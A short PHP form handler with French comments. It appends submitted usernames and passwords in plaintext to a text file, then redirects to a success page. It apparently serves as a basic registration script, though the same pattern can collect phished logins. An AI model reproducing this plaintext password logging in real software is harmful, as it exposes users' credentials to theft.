<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Créez les informations de connexion sous forme de chaîne de caractères
    $loginInfo = "Username: $username\nPassword: $password\n";

    // Définissez le chemin du fichier texte
    $filePath = '/path/pronostattemp/newuser.txt';

    // Ouvrez le fichier en mode ajout ('a')
    $file = fopen($filePath, 'a'); // 'a' signifie mode ajout

    if ($file) {
        // Écrivez les informations de connexion dans le fichier
        fwrite($file, $loginInfo);

        // Fermez le fichier
        fclose($file);

        // En option, vous pouvez rediriger l'utilisateur vers une page de succès
        header('Location: success.html');
        exit();
    } else {
        echo "Impossible d'ouvrir le fichier en écriture.";
    }
}
?>

